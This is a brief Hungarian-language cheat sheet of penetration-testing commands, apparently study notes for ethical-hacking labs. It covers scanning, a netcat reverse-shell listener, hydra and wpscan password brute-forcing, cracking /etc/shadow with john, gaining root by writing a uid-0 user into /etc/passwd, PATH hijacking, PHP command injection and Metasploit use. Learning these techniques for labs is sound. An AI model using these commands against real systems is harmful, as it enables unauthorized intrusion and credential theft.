# ethack
0-ik lépés ping!

## Linkek:
```
```

## Honlap ip:
```
https://172.22.214.126:1234
https://10.0.0.52
```

## Első lépés megnézni a nyitott portokat:(+ip)
```
sudo nmap -sS -p- -T5
```

## Megnézni a nyitott portokról infót:(+ip)
```
sudo nmap -sS -sC -sV -p 22,80
```

## Dirb(+http://)
```
dirb -r
```
## Ssh login
```
ssh(-p port) -i /home/kali/privkulcs root@192.168.1.110
ssh student@192.168.1.188
ssh jangow@localhost
```

## Listener
```
nc -lvnp 4444
```

## Interaktív shell
```
python -c "import pty; pty.spawn('/bin/bash')"
```

## Jelszó törés:
```
hydra -l <username> -s <port> -P <jelszavak> <ip> <kérés mód(pl: http-get)> "/path/to/login"
```

[exploit-db.com]
[gtfobins.github.io

## Rossz jogosultságok vizsgálata:
```
/etc/passwd
/etc/shadow
```
## Suid bit vizsgálata:
```
find / -perm -u=s -user root 2>/dev/null
```

## Tudjuk írni az /etc/passwd(asd a jelszó)
```
openssl passwd asd
nano /etc/passwd
miclos:opensslcuccos:0:0:/root:/bin/bash
még az utolsó nulla után mehet esetleg üzenet, ha x akkor a shadow-ban keresi
su miclos
switch user az su
```

## Ha tudjuk olvasni a passwd és shadow:
```
unshadow passwd.txt shadow.txt > john-input
john --show john-input --wordlist=/usr/share/wordlists/rockyou.txt
```

## Path hijacking
```
Keresni vagy csinálni egy file-t ami futtatható és például ls nevet adni neki és a fileba bash script ként egy reverseshell fut le vagy akármilyen script.
export PATH=/home/miclos:$PATH
```

## Mihez van jogom:
```
sudo -l
```

robots.txt

## Php ?vmi=vmi futtatás
```
vmi.php?vmi=kód a kód helyére írhatunk bármit ls-el érdemes kipróbálni utána pl python reverse shell jó lehet
```

## Jogosultság adás:
```
chmod 777
```

## Célgép hány bites:
```
arch
```

## Python http server:
```
python -m http.server port
python3 -m http.server port
wget http://ip:port/file
```

## Ha nem ip-re hivatokozik a weblap hanem pl vtcsec-re:
```
nano /etc/hosts
```

## Msfconsole:
```
search proftpd
user 5
options
set rhosts ip
options h jó e
run
néha kellhet: show payloads
set payload 5
```
## Burpsuit
```
burpsuite
ellehet vele kéréseket kapni és módosítani
```

## Wordpress feltörés:
```
wpscan --url ip --usernames <név> --passwords /usr/share/wordlists/rockyou.txt
```
